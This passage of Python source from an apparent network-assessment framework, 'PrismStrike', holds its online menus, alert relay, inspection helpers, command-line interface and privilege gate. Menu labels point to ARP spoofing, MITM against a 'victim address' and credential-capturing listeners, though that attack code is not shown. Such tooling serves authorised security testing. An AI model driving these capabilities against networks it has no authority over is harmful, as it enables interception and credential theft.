                             "preview": preview}, severity="CRITICAL")


def alert_wireless_ap(bssid: str, ssid: str, channel: Any, encryption: str) -> bool:
    return alert_event("wifi-ap", "AP %s '%s' channel %s (%s)" % (bssid, ssid, channel, encryption),
                       data={"bssid": bssid, "ssid": ssid, "channel": channel,
                             "encryption": encryption})


# ---------------------------------------------------------------------------
# Interactive consoles
# ---------------------------------------------------------------------------
def online_console_interactive(title: str, tools: "OrderedDict[str, Callable[[], None]]") -> None:
    """Generic per-module online menu: `tools` maps label text to a callable."""
    while True:
        heading(title)
        relay = ALERT_RELAY
        kv_table([
            ("Alert relay", str(relay) if relay else "not armed"),
            ("Relay delivered/failed", "%d / %d" % (relay.sent, relay.failed) if relay else "-"),
            ("Journal sink", ("streaming" if relay and relay.sink else "off") if relay else "-"),
        ])
        keys = list(tools.keys())
        for index, label in enumerate(keys, start=1):
            out("  [%s] %s" % (c(str(index), "byellow", "bold"), label))
        out("  [%s] %s" % (c("a", "byellow", "bold"), "Arm/manage the alert relay and event sink"))
        out("  [%s] %s" % (c("0", "byellow", "bold"), "Return to the previous menu"))
        choice = prompt_text("online> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip().lower()
        if choice in ("0", ""):
            return
        if choice == "a":
            alert_relay_console_interactive()
            continue
        try:
            index = int(choice)
        except (TypeError, ValueError):
            warn("unrecognised selection '%s'." % choice)
            continue
        if 1 <= index <= len(keys):
            try:
                tools[keys[index - 1]]()
            except AbortOperation:
                warn("operation aborted by operator.")
            except FrameworkError as exc:
                err(str(exc))
            continue
        warn("unrecognised selection '%s'." % choice)


def alert_relay_console_interactive() -> None:
    """Configure, arm, probe and stop the shared detection relay / event sink."""
    while True:
        heading("ALERT RELAY & EVENT SINK")
        relay = ALERT_RELAY
        kv_table([
            ("State", "armed" if relay else "disarmed"),
            ("Webhook", (relay.webhook_url or "not configured") if relay else "-"),
            ("Journal sink", ("enabled" if relay.sink else "disabled") if relay else "-"),
            ("Delivered / failed / dropped", "%d / %d / %d" % (relay.sent, relay.failed, relay.dropped)
             if relay else "-"),
            ("Event kinds", ", ".join(ALERT_KINDS)),
        ])
        options = OrderedDict([
            ("1", "Arm the relay (webhook and/or syslog target)"),
            ("2", "Enable the NDJSON journal sink while arming"),
            ("3", "Send a synchronous probe through the relay"),
            ("4", "Show delivery statistics"),
            ("5", "Disarm the relay"),
            ("6", "Push the newest artefact for a module to a collector"),
            ("0", "Return to the previous menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("relay> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()
        if choice == "0":
            return
        if choice == "1":
            url = prompt_text("alert webhook URL (blank = syslog-only relay)", default="",
                              allow_blank=True)
            if url is PROMPT_ABORT:
                return
            token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
            if token is PROMPT_ABORT:
                return
            syslog_spec = prompt_text("syslog target for mirrored alerts (blank = none)",
                                      default="", allow_blank=True)
            if syslog_spec is PROMPT_ABORT:
                return
            shipper = None
            try:
                if str(syslog_spec).strip():
                    target = parse_syslog_target(syslog_spec)
                    shipper = RemoteLogShipper(host=target["host"], port=target["port"],
                                               protocol=target["protocol"], facility="local0")
                    shipper.start()
                relay = arm_alerts(AlertRelay(webhook_url=str(url).strip(),
                                              token=str(token).strip(), syslog_shipper=shipper,
                                              sink=False))
                probe = relay.test()
                if probe["delivered"]:
                    ok("relay armed and the collector accepted a probe (%s)." % probe["detail"])
                else:
                    warn("relay armed but the probe did not confirm delivery: %s" % probe["detail"])
            except FrameworkError as exc:
                err(str(exc))
            continue
        if choice == "2":
            url = prompt_text("collector URL for the journal sink")
            if url is PROMPT_ABORT:
                return
            token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
            if token is PROMPT_ABORT:
                return
            try:
                relay = arm_alerts(AlertRelay(webhook_url=str(url).strip(),
                                              token=str(token).strip(), sink=True))
                probe = relay.test()
                if probe["delivered"]:
                    ok("event sink streaming every journal line to %s" % url)
                else:
                    warn("sink armed; probe not confirmed (%s)" % probe["detail"])
            except FrameworkError as exc:
                err(str(exc))
            continue
        if choice == "3":
            if relay is None:
                warn("no relay armed - use option 1 first.")
                continue
            kv_table(relay.test().items())
            continue
        if choice == "4":
            if relay is None:
                warn("no relay armed.")
                continue
            kv_table(relay.stats().items())
            continue
        if choice == "5":
            if relay is None:
                warn("nothing to disarm.")
                continue
            disarm_alerts()
            ok("relay disarmed; pending events were drained first.")
            continue
        if choice == "6":
            module = prompt_text("artefact module token (e.g. dhcp, wlan_scan, icmp_sweep)")
            if module is PROMPT_ABORT:
                return
            url = prompt_text("collector URL")
            if url is PROMPT_ABORT:
                return
            token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
            if token is PROMPT_ABORT:
                return
            try:
                push_artefact(str(module).strip(), str(url).strip(), token=str(token).strip())
            except FrameworkError as exc:
                err(str(exc))
            continue
        warn("unrecognised selection '%s'." % choice)


def event_sink_console_interactive() -> None:
    """Module 10 option 7: stream the session journal to an HTTP collector as NDJSON."""
    heading("NDJSON EVENT SINK (REMOTE JOURNAL STREAM)")
    kv_table([
        ("Transport", "HTTP POST, one JSON document per journal event"),
        ("Source", LOGGER.json_path),
        ("Guarantees", "bounded queue, drop-oldest accounting, automatic retry, local journal untouched"),
        ("Current relay", str(ALERT_RELAY) if ALERT_RELAY else "not armed"),
    ])
    url = prompt_text("collector URL (http/https)")
    if url is PROMPT_ABORT:
        return
    token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
    if token is PROMPT_ABORT:
        return
    max_events = prompt_int("cap events per session (safety)", 10, 1000000, 20000)
    if max_events is PROMPT_ABORT:
        return
    try:
        relay = arm_alerts(AlertRelay(webhook_url=str(url).strip(), token=str(token).strip(),
                                      sink=True, queue_size=int(max_events)))
        probe = relay.test()
        if probe["delivered"]:
            ok("journal sink streaming to %s (cap %d events)." % (url, max_events))
        else:
            warn("sink armed but the probe failed: %s" % probe["detail"])
    except FrameworkError as exc:
        err(str(exc))


# -- per-module online consoles --------------------------------------------
def online_recon_console() -> None:
    """Module 01 online menu: enrich sweep/probe results over the wire."""
    def _enrich() -> None:
        raw = prompt_text("targets to enrich (comma/space separated)")
        if raw is PROMPT_ABORT:
            return
        targets = [token for token in re.split(r"[,\s]+", str(raw)) if token]
        if not targets:
            warn("no targets supplied.")
            return
        geo = prompt_yes_no("include geolocation/ASN enrichment (third-party API)?", False)
        enrich_targets(targets, do_geo=bool(geo))

    def _doh() -> None:
        doh_interactive()

    online_console_interactive("MODULE 01 - ONLINE RECONNAISSANCE ENRICHMENT", OrderedDict([
        ("Enrich a target list (DoH-safe resolution, PTR, RDAP ownership)", _enrich),
        ("RDAP ownership lookup for one address or domain", rdap_interactive),
        ("Resolve a name over DNS over HTTPS", _doh),
        ("DNSBL reputation check for an address", dnsbl_interactive),
        ("Geolocation / ASN lookup for one address", geoip_interactive),
    ]))


def online_tcp_console() -> None:
    """Module 02 online menu: enrich port findings with live service data."""
    online_console_interactive("MODULE 02 - ONLINE SERVICE ENRICHMENT", OrderedDict([
        ("TLS certificate + cipher inspection of a service", tls_inspect_interactive),
        ("HTTP response inspection (headers, redirects, hardening)", http_inspect_interactive),
        ("RDAP ownership lookup for the target", rdap_interactive),
        ("Enrich a target list (PTR + RDAP + optional geo)", lambda: online_recon_console()),
    ]))


def online_hping_console() -> None:
    """Module 03 online menu: stream live probe telemetry to a collector."""
    online_console_interactive("MODULE 03 - ONLINE PROBE TELEMETRY", OrderedDict([
        ("Arm the alert relay so live reply telemetry ships remotely",
         alert_relay_console_interactive),
        ("Push the newest hping artefact to a collector",
         lambda: push_artefact_interactive("hping")),
        ("Forward stats to syslog (RFC5424) instead",
         lambda: module_syslog_forward_interactive()),
    ]))


def online_nmap_console() -> None:
    """Module 04 online menu: bulk enrichment of scan results."""
    online_console_interactive("MODULE 04 - ONLINE SCAN ENRICHMENT", OrderedDict([
        ("Enrich scanned hosts (RDAP ownership + PTR + optional geo)",
         lambda: online_recon_console()),
        ("TLS inspection of a discovered HTTPS service", tls_inspect_interactive),
        ("HTTP endpoint inspection", http_inspect_interactive),
        ("Push the newest nmap artefact to a collector",
         lambda: push_artefact_interactive("nmap")),
    ]))


def online_sniffer_console() -> None:
    """Module 05 online menu: stream captures/digests to a remote collector."""
    online_console_interactive("MODULE 05 - ONLINE CAPTURE PIPELINE", OrderedDict([
        ("Stream every journal event to an HTTP collector (NDJSON sink)",
         event_sink_console_interactive),
        ("Push the newest sniffer/capture artefact to a collector",
         lambda: push_artefact_interactive("sniffer")),
        ("Configure remote syslog shipping for capture events",
         syslog_console_interactive),
    ]))


def online_arp_console() -> None:
    """Module 06 online menu: online vendor resolution and device alerts."""
    def _vendors() -> None:
        raw = prompt_text("MAC addresses (comma/space separated)")
        if raw is PROMPT_ABORT:
            return
        for token in re.split(r"[,\s]+", str(raw)):
            if not token:
                continue
            try:
                mac_vendor_online(token)
            except FrameworkError as exc:
                err(str(exc))
    online_console_interactive("MODULE 06 - ONLINE DEVICE INTELLIGENCE", OrderedDict([
        ("Resolve MAC vendors online (API with local-table fallback)", _vendors),
        ("Arm the relay so newly discovered devices raise remote alerts",
         alert_relay_console_interactive),
        ("RDAP ownership of the gateway or a device address", rdap_interactive),
    ]))


def online_mitm_console() -> None:
    """Module 07 online menu: poisoning-lifecycle alerting and gateway dossier."""
    online_console_interactive("MODULE 07 - ONLINE MITM TELEMETRY", OrderedDict([
        ("Arm the relay for poisoning-lifecycle and conflict alerts",
         alert_relay_console_interactive),
        ("RDAP dossier on the gateway address", rdap_interactive),
        ("Reverse DNS + enrichment of a victim address",
         lambda: online_recon_console()),
    ]))


def online_utils_console() -> None:
    """Module 13 online menu: remote service fingerprinting over the wire."""
    online_console_interactive("MODULE 13 - ONLINE SERVICE FINGERPRINTING", OrderedDict([
        ("TLS certificate, cipher and trust inspection", tls_inspect_interactive),
        ("HTTP response and security-header audit", http_inspect_interactive),
        ("RDAP ownership lookup", rdap_interactive),
        ("Resolve over DNS over HTTPS", doh_interactive),
    ]))


def online_dhcp_console() -> None:
    """Module 14 online menu: rogue-server alerting and lease-ledger push."""
    online_console_interactive("MODULE 14 - ONLINE DHCP TELEMETRY", OrderedDict([
        ("Push the newest lease/discovery artefact to a collector",
         lambda: push_artefact_interactive("dhcp")),
        ("Arm the relay so discovered DHCP servers raise remote alerts",
         alert_relay_console_interactive),
        ("Forward DHCP alerts to a remote syslog collector", syslog_console_interactive),
    ]))


def online_dns_console() -> None:
    """Module 15 online menu: DoH resolution and reputation checks."""
    online_console_interactive("MODULE 15 - ONLINE DNS SERVICES", OrderedDict([
        ("DNS over HTTPS resolver (filtered-segment friendly)", doh_interactive),
        ("DNSBL/RBL reputation check for an address", dnsbl_interactive),
        ("Arm the relay for tunnelling/DGA detections",
         alert_relay_console_interactive),
        ("Online OUI/vendor lookup (decode resolver hardware)", macvendor_interactive),
    ]))


def online_wireless_console() -> None:
    """Module 16 online menu: vendor intelligence and scan-result push."""
    def _ap_vendors() -> None:
        raw = prompt_text("BSSID list (comma/space separated)")
        if raw is PROMPT_ABORT:
            return
        for token in re.split(r"[,\s]+", str(raw)):
            if not token:
                continue
            try:
                mac_vendor_online(token)
            except FrameworkError as exc:
                err(str(exc))
    online_console_interactive("MODULE 16 - ONLINE WIRELESS INTELLIGENCE", OrderedDict([
        ("Resolve AP vendors online (OUI API with local fallback)", _ap_vendors),
        ("Push the newest scan artefact to a collector",
         lambda: push_artefact_interactive("wlan")),
        ("Arm the relay so new APs raise remote alerts",
         alert_relay_console_interactive),
    ]))


def online_listeners_console() -> None:
    """Module 17 online menu: geolocation and remote alerting for captures."""
    online_console_interactive("MODULE 17 - ONLINE AWARENESS PIPELINE", OrderedDict([
        ("Geolocate a captured client address", geoip_interactive),
        ("Arm the relay so credential captures alert remotely (secrets never relayed)",
         alert_relay_console_interactive),
        ("Push the newest listener artefact to a collector",
         lambda: push_artefact_interactive("listener")),
        ("Reverse DNS lookup of a captured client", lambda: _reverse_lookup_interactive()),
    ]))


# -- small interactive helpers shared by the consoles ------------------------
def rdap_interactive() -> None:
    target = prompt_text("RDAP target (IPv4/IPv6 address or domain)")
    if target is PROMPT_ABORT:
        return
    base = prompt_text("RDAP bootstrap base", default=RDAP_DEFAULT_BOOTSTRAP)
    if base is PROMPT_ABORT:
        return
    try:
        rdap_lookup(str(target).strip(), bootstrap=str(base).strip())
    except FrameworkError as exc:
        err(str(exc))


def doh_interactive() -> None:
    name = prompt_text("name to resolve")
    if name is PROMPT_ABORT:
        return
    qtype = prompt_choice("record type", list(DOH_TYPE_CODES.keys()), "A")
    if qtype is PROMPT_ABORT:
        return
    resolver_name = prompt_choice("DoH resolver", list(DOH_RESOLVERS.keys()), "cloudflare")
    if resolver_name is PROMPT_ABORT:
        return
    try:
        doh_query(str(name).strip(), qtype=str(qtype), resolver=DOH_RESOLVERS[str(resolver_name)])
    except FrameworkError as exc:
        err(str(exc))


def dnsbl_interactive() -> None:
    address = prompt_text("IPv4 address to check")
    if address is PROMPT_ABORT:
        return
    try:
        dnsbl_check(str(address).strip())
    except FrameworkError as exc:
        err(str(exc))


def geoip_interactive() -> None:
    address = prompt_text("IPv4 address for the geolocation/ASN lookup")
    if address is PROMPT_ABORT:
        return
    endpoint = prompt_text("geolocation API base", default=GEOIP_DEFAULT_ENDPOINT)
    if endpoint is PROMPT_ABORT:
        return
    try:
        geoip_lookup(str(address).strip(), api_base=str(endpoint).strip())
    except FrameworkError as exc:
        err(str(exc))


def macvendor_interactive() -> None:
    mac = prompt_text("MAC address (any common notation)")
    if mac is PROMPT_ABORT:
        return
    try:
        mac_vendor_online(str(mac).strip())
    except FrameworkError as exc:
        err(str(exc))


def tls_inspect_interactive() -> None:
    host = prompt_text("TLS host (name or address)")
    if host is PROMPT_ABORT:
        return
    port = prompt_int("port", 1, 65535, 443)
    if port is PROMPT_ABORT:
        return
    try:
        tls_inspect(str(host).strip(), port=int(port))
    except FrameworkError as exc:
        err(str(exc))


def http_inspect_interactive() -> None:
    url = prompt_text("URL (https:// is assumed when the scheme is omitted)")
    if url is PROMPT_ABORT:
        return
    follow = prompt_yes_no("follow redirects?", True)
    try:
        http_inspect(str(url).strip(), follow=bool(follow))
    except FrameworkError as exc:
        err(str(exc))


def push_artefact_interactive(module: str) -> None:
    url = prompt_text("collector URL for the '%s' artefact" % module)
    if url is PROMPT_ABORT:
        return
    token = prompt_text("bearer token (blank = none)", default="", allow_blank=True)
    if token is PROMPT_ABORT:
        return
    try:
        push_artefact(module, str(url).strip(), token=str(token).strip())
    except FrameworkError as exc:
        err(str(exc))


def _reverse_lookup_interactive() -> None:
    target = prompt_text("address or hostname for the reverse lookup")
    if target is PROMPT_ABORT:
        return
    try:
        address = resolve_target(str(target).strip())
        name = reverse_lookup(address)
        heading("REVERSE DNS")
        kv_table([("Query", target), ("Resolved", address), ("PTR name", name or "no PTR record")])
        if name:
            alert_event("probe", "reverse lookup: %s -> %s" % (address, name))
    except (FrameworkError, OSError) as exc:
        err(str(exc))


def module_syslog_forward_interactive() -> None:
    """Attach a syslog collector to the session for live event forwarding."""
    syslog_console_interactive()
# ===========================================================================
# BANNER, COMMAND LINE INTERFACE, SESSION LIFECYCLE
# ===========================================================================
BANNER_ART = r"""
 ███╗   ██╗███████╗████████╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗
 ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
 ██╔██╗ ██║█████╗     ██║   █████╗  ██║   ██║██████╔╝██║  ███╗█████╗
 ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝
 ██║ ╚████║███████╗   ██║   ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
 ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
"""

BANNER_SUBTITLE = ("Modular Interactive Network Operations & Security Assessment Framework "
                   "v%s (%s)" % (__version__, __build__))


def print_banner(compact: bool = False) -> None:
    """Render the framework banner; compact mode is used inside the menu loop."""
    width = 78
    out("")
    if compact:
        title = "PrismStrike v%s" % __version__
        out(c("  " + title + " ".ljust(max(1, width - len(title) - 3), "─"), "bmagenta", "bold"))
        return
    for line in BANNER_ART.strip("\n").splitlines():
        out(c(line, "bmagenta", "bold"))
    out(c(BANNER_SUBTITLE.center(width), "grey"))
    rule(width)
    out(c("  AUTHORISED TESTING ONLY ".center(width, "="), "byellow", "bold"))
    out("  This framework crafts raw packets, forges ARP replies and toggles kernel".center(width))
    out("  forwarding. Every module performs a privilege check and every session is".center(width))
    out("  journaled to disk. Use it only on networks you own or are contracted to test.".center(width))
    rule(width)
    out("")
    out("  %s %s" % (c("scapy:", "cyan"),
                     c("loaded" if SCAPY_AVAILABLE else "MISSING (pip install scapy)", "bgreen")
                     if SCAPY_AVAILABLE else c("MISSING (pip install scapy)", "bred")))
    out("  %s %s" % (c("python-nmap:", "cyan"),
                     c("loaded" if NMAP_LIB_AVAILABLE else "MISSING (pip install python-nmap)", "bgreen")
                     if NMAP_LIB_AVAILABLE else c("MISSING (pip install python-nmap)", "bred")))
    out("  %s %s" % (c("dns layers:", "cyan"),
                     c("loaded" if DNS_LAYERS_AVAILABLE else "MISSING (upgrade scapy)", "bgreen")
                     if DNS_LAYERS_AVAILABLE else c("MISSING (upgrade scapy)", "bred")))
    out("  %s %s" % (c("802.11 layers:", "cyan"),
                     c("loaded" if WIRELESS_LAYERS_AVAILABLE else "MISSING (upgrade scapy)", "bgreen")
                     if WIRELESS_LAYERS_AVAILABLE else c("MISSING (upgrade scapy)", "bred")))
    out("  %s %s" % (c("extension:", "cyan"),
                     c("modules 13-18 active (utils / dhcp / dns / wireless / listeners / reports)",
                       "bgreen")))
    out("  %s %s" % (c("online layer:", "cyan"),
                     c("live capture analysis / remote ingest / syslog shipping / webhook+SMTP delivery",
                       "bgreen")))
    out("  %s %s" % (c("nmap binary:", "cyan"), c(NmapEngine.binary_version(), "bgreen")))
    out("  %s %s" % (c("privilege:", "cyan"),
                     c("root/administrator", "bgreen", "bold") if Privileges.is_root()
                     else c("unprivileged - raw modules will be gated", "byellow", "bold")))
    out("  %s %s" % (c("journal:", "cyan"), c(LOGGER.txt_path, "grey")))
    out("")


def build_argument_parser() -> argparse.ArgumentParser:
    """Command line surface: session tuning plus non-interactive module entry."""
    parser = argparse.ArgumentParser(
        prog="prismstrike",
        description="PrismStrike - interactive network operations and security assessment framework.",
        epilog="Examples:  sudo python3 prismstrike.py --self-test  |  "
               "sudo python3 prismstrike.py --module icmp  |  python3 prismstrike.py --module pcap  |  "
               "python3 prismstrike.py --self-test --report  |  "
               "python3 prismstrike.py --syslog 10.0.0.9:5514/tcp  |  "
               "python3 prismstrike.py --push-report https://intake.lab/upload",
    )
    parser.add_argument("--module", "-m", default=None,
                        choices=["icmp", "tcp", "hping", "nmap", "sniffer", "arp-discovery",
                                 "arp-spoof", "pcap", "sysint", "logs", "doctor", "utils",
                                 "dhcp", "dns", "wlan", "listeners", "extras", "report",
                                 "self-test", "menu"],
                        help="jump straight into one module instead of the master menu")
    parser.add_argument("--log-dir", default=DEFAULT_LOG_DIR,
                        help="directory for session journals and artefacts (default: ./logs)")
    parser.add_argument("--mirror-terminal", action="store_true",
                        help="mirror every terminal line into the session .txt ledger")
    parser.add_argument("--no-color", action="store_true", help="disable ANSI colour output")
    parser.add_argument("--session-tag", default="", help="suffix added to the session identifier")
    parser.add_argument("--self-test", action="store_true",
                        help="run the non-destructive platform self-test suite and exit")
    parser.add_argument("--no-live-tests", action="store_true",
                        help="skip loopback capture/probe tests during --self-test")
    parser.add_argument("--report", action="store_true",
                        help="write an HTML session report plus Markdown summary when the session closes")
    parser.add_argument("--syslog", default="", metavar="HOST[:PORT][/udp|tcp]",
                        help="stream every journal event to a remote syslog collector for the whole session")
    parser.add_argument("--push-report", default="", metavar="URL",
                        help="POST the HTML session report to a remote webhook when the session closes")
    parser.add_argument("--push-token", default="",
                        help="bearer token presented to --push-report")
    parser.add_argument("--email-report", default="", metavar="SMTP_HOST",
                        help="email the session summary when the session closes (requires --email-to)")
    parser.add_argument("--email-to", default="", metavar="A,B",
                        help="comma separated recipients for --email-report")
    parser.add_argument("--email-port", type=int, default=587,
                        help="SMTP port for --email-report (default 587)")
    parser.add_argument("--email-user", default="",
                        help="SMTP username for --email-report (password read from PrismStrike_SMTP_PASSWORD)")
    parser.add_argument("--no-email-tls", action="store_true",
                        help="do not negotiate STARTTLS when delivering --email-report")
    parser.add_argument("--remote-dossier", default="", metavar="TARGET",
                        help="build an online dossier on a remote host (DNS/route/RTT/TCP) and exit")
    parser.add_argument("--online-deps", action="store_true",
                        help="compare installed packages with the published releases and exit")
    parser.add_argument("--online-capture", default="", metavar="IFACE",
                        help="capture live traffic on IFACE, analyse it immediately and exit")
    parser.add_argument("--capture-seconds", type=float, default=20.0,
                        help="capture duration for --online-capture in seconds (default 20)")
    parser.add_argument("--capture-filter", default="", metavar="BPF",
                        help="BPF filter applied to --online-capture (default: none)")
    parser.add_argument("--rdap", default="", metavar="TARGET",
                        help="RDAP ownership lookup for an address or domain and exit")
    parser.add_argument("--doh", default="", metavar="NAME",
                        help="resolve NAME over DNS over HTTPS and exit")
    parser.add_argument("--doh-type", default="A", help="record type for --doh (default: A)")
    parser.add_argument("--tls-inspect", default="", metavar="HOST[:PORT]",
                        help="inspect a live TLS service certificate and negotiation and exit")
    parser.add_argument("--http-inspect", default="", metavar="URL",
                        help="fetch and audit a live HTTP(S) response and exit")
    parser.add_argument("--alert-webhook", default="", metavar="URL",
                        help="arm the alert relay: every detection streams to this collector")
    parser.add_argument("--alert-token", default="", help="bearer token for --alert-webhook")
    parser.add_argument("--event-sink", default="", metavar="URL",
                        help="stream the whole session journal to an HTTP collector as NDJSON")
    parser.add_argument("--allow-unprivileged", action="store_true",
                        help="start without root/administrator authority (raw modules stay gated)")
    parser.add_argument("--version", action="version",
                        version="%s %s (%s)" % (__framework__, __version__, __build__))
    return parser


def configure_console(default_no_color: bool = False) -> None:
    """Decide whether ANSI colour can be emitted safely."""
    colour_enabled = True
    if default_no_color or os.environ.get("NO_COLOR"):
        colour_enabled = False
    if not sys.stdout.isatty():
        colour_enabled = False
    if platform.system().lower().startswith("win") and not os.environ.get("WT_SESSION"):
        colour_enabled = False
    Palette.configure(colour_enabled)


GLOBAL_LOGGER: Optional[EventLogger] = None  # populated in main(); LOGGER is bound at import


def startup_privilege_gate(allow_unprivileged: bool, interactive: bool) -> bool:
    """
    Mandatory startup verification of root/administrative authority.

    Returns True when the session may continue. In interactive mode an
    unprivileged operator is offered a restricted (menu-gated) session; in
    non-interactive mode the process exits so automation never silently
    degrades.
    """
    heading("PRIVILEGE VERIFICATION (STARTUP GATE)")
    description = Privileges.describe()
    kv_table([
        ("Operating system", "%s %s (%s)" % (description["platform"], description["release"],
                                             description["architecture"]
                                             if "architecture" in description else platform.machine())),
        ("Operator", description["user"]),
        ("Effective UID", description["euid"]),
        ("Root/administrator", "yes" if description["is_root"] else "no"),
        ("Raw socket probe", "available" if description["raw_socket_ok"] else "denied"),
        ("Passwordless sudo", "available" if description["can_privilege_escalate"] else "no"),
    ])
    if description["is_root"] or description["raw_socket_ok"]:
        ok("raw-socket authority confirmed - every module is unlocked.")
        LOGGER.event("privilege", "startup privilege gate passed",
                     data={"euid": description["euid"], "root": description["is_root"],
                           "raw_socket": description["raw_socket_ok"]})
        return True
    warn("this session does NOT hold root/administrator authority.")
    out("      Raw-socket modules (ICMP, TCP crafting, hping, sniffer, ARP, MITM) will refuse to run.")
    out("      Relaunch with: %s" % c("sudo %s %s" % (sys.executable, os.path.basename(SCRIPT_PATH)),
                                      "bgreen"))
    LOGGER.event("privilege", "startup privilege gate: unprivileged session", level="WARN",
                 data=description)
    if allow_unprivileged:
        warn("continuing because --allow-unprivileged was supplied.")
        return True
    if not interactive:
        err("aborting: non-interactive launch without privileges (use --allow-unprivileged to override).")
        return False
    if prompt_yes_no("Continue in restricted mode (read-only/nmap/pcap modules only)?", False):
        return True
    err("privilege verification failed - exiting.")
    return False


def session_shutdown(exit_code: int) -> int:
    """Write the roll-up, close handles and report the journal location."""
    if REPORT_ON_EXIT:
        try:
            generate_html_report()
            export_markdown_summary()
        except Exception as exc:  # report export must never block the shutdown path
            warn("automatic report export failed: %s: %s" % (type(exc).__name__, exc))
    try:
        attached_shipper = getattr(LOGGER, "syslog_shipper", None)
        if attached_shipper is not None:
            attached_shipper.stop()
            LOGGER.attach_syslog(None)
    except Exception as exc:
        warn("remote syslog detach failed: %s: %s" % (type(exc).__name__, exc))
    if ONLINE_PUSH.get("url"):
        try:
            push_report_webhook(generate_html_report(), ONLINE_PUSH["url"],
                                token=ONLINE_PUSH.get("token", ""))
        except Exception as exc:
            warn("webhook report delivery failed: %s: %s" % (type(exc).__name__, exc))
    if ALERT_RELAY is not None:
        try:
            disarm_alerts()
        except Exception as exc:
            warn("alert relay shutdown failed: %s: %s" % (type(exc).__name__, exc))
    if ONLINE_EMAIL.get("host"):
        recipients = ONLINE_EMAIL.get("recipients") or []
        if not recipients:
            warn("--email-report needs at least one --email-to recipient - delivery skipped.")
        else:
            try:
                email_report_smtp(
                    smtp_host=ONLINE_EMAIL["host"], recipients=recipients,
                    subject="PrismStrike session %s (%s)" % (LOGGER.session_id, platform.node()),
                    body_text="Automated PrismStrike session summary.",
                    attachments=[item for item in (export_markdown_summary(),
                                                   generate_html_report()) if item],
                    port=int(ONLINE_EMAIL.get("port", 587)),
                    username=ONLINE_EMAIL.get("username", ""),
                    password=os.environ.get("PrismStrike_SMTP_PASSWORD", ""),
                    use_starttls=bool(ONLINE_EMAIL.get("use_starttls", True)))
            except Exception as exc:
                warn("email summary delivery failed: %s: %s" % (type(exc).__name__, exc))
    try:
        summary = LOGGER.summary()
        heading("SESSION CLOSED")
        kv_table([
            ("Session ID", summary["session"]),
            ("Duration", summary["duration_human"]),
            ("Events recorded", summary["total_events"]),
            ("Failures logged", summary["event_counts"].get("errors", 0)),
            ("Text ledger", summary["log_txt"]),
            ("JSON events", summary["log_json"]),
            ("Summary", summary["summary_json"]),
            ("Artefacts", LOGGER.artifact_dir),
        ])
    except Exception as exc:  # shutdown must never raise
        err("session summary could not be written: %s: %s" % (type(exc).__name__, exc))
    finally:
        try:
            LOGGER.close()
        except Exception:
            pass
    return exit_code


def main(argv: Optional[List[str]] = None) -> int:
    """Program entry point: parse args, gate privileges, dispatch, journal."""
    global LOGGER, GLOBAL_LOGGER, REPORT_ON_EXIT
    parser = build_argument_parser()
    try:
        args = parser.parse_args(argv)
    except SystemExit as exc:
        # argparse handles --help/--version/errors; normalise the exit code.
        return int(exc.code or 0) if isinstance(exc.code, int) else 2

    configure_console(default_no_color=bool(args.no_color))
    REPORT_ON_EXIT = bool(getattr(args, "report", False))
    ONLINE_PUSH.clear()
    ONLINE_PUSH.update({"url": str(getattr(args, "push_report", "") or "").strip(),
                        "token": str(getattr(args, "push_token", "") or "").strip()})
    ONLINE_EMAIL.clear()
    ONLINE_EMAIL.update({
        "host": str(getattr(args, "email_report", "") or "").strip(),
        "recipients": [item.strip() for item in
                       str(getattr(args, "email_to", "") or "").split(",") if item.strip()],
        "port": int(getattr(args, "email_port", 587) or 587),
        "username": str(getattr(args, "email_user", "") or "").strip(),
        "use_starttls": not bool(getattr(args, "no_email_tls", False)),
    })

    # Rebind the module-level logger to the operator-selected configuration.
    LOGGER = EventLogger(log_dir=str(args.log_dir), mirror_terminal=bool(args.mirror_terminal),
                         session_tag=str(args.session_tag))
    GLOBAL_LOGGER = LOGGER
    if args.mirror_terminal:
        sys.stdout = TerminalMirror(sys.stdout, LOGGER)

    # Register the last-resort cleanup hooks before anything else can fail.
    atexit.register(LOGGER.close)
    for signal_name in ("SIGINT", "SIGTERM"):
        signal_number = getattr(signal, signal_name, None)
        if signal_number is None:
            continue
        try:
            signal.signal(signal_number, _top_level_signal_handler)
        except (ValueError, OSError, RuntimeError):
            continue

    if str(getattr(args, "syslog", "") or "").strip():
        try:
            remote_collector = parse_syslog_target(args.syslog)
            active_shipper = RemoteLogShipper(host=remote_collector["host"],
                                              port=remote_collector["port"],
                                              protocol=remote_collector["protocol"],
                                              facility="local0")
            active_shipper.start()
            LOGGER.attach_syslog(active_shipper)
            out("  %s journal shipping to %s" % (c("ONLINE", "bcyan", "bold"), active_shipper))
        except Exception as exc:
            warn("remote syslog shipping disabled: %s: %s" % (type(exc).__name__, exc))

    relay_target = (str(getattr(args, "alert_webhook", "") or "").strip()
                    or str(getattr(args, "event_sink", "") or "").strip())
    sink_url = str(getattr(args, "event_sink", "") or "").strip()
    if sink_url and relay_target and sink_url != relay_target:
        warn("--event-sink names %s but the armed relay posts to %s: the journal mirror "
             "follows the relay endpoint, so pass the sink URL on its own to deliver there."
             % (sink_url, relay_target))
    if relay_target:
        try:
            armed_relay = AlertRelay(
                webhook_url=relay_target,
                token=str(getattr(args, "alert_token", "") or "").strip(),
                syslog_shipper=getattr(LOGGER, "syslog_shipper", None),
                sink=bool(str(getattr(args, "event_sink", "") or "").strip()))
            arm_alerts(armed_relay)
            out("  %s alert relay armed: %s%s" % (
                c("ONLINE", "bcyan", "bold"), relay_target,
                " (streaming the whole journal)" if armed_relay.sink else ""))
        except Exception as exc:
            warn("alert relay not armed: %s: %s" % (type(exc).__name__, exc))

    print_banner()
    LOGGER.event("session", "session started",
                 data={"argv": sys.argv[1:], "cwd": os.getcwd(),
                       "python": platform.python_version(), "euid": Privileges.euid()})

    if args.self_test:
